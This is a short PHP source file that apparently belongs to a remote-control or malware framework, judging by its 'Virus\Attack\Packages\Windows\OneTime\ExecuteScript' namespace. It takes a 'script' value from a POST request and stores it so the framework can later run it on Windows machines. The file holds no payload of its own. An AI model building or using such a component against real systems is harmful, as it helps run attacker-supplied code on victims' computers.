<?php

use Kelvinho\Virus\Attack\Packages\Windows\OneTime\ExecuteScript;

/** @var ExecuteScript $this */

$script = $this->requestData->postCheck("script");

$this->setScript($script);
$this->saveState();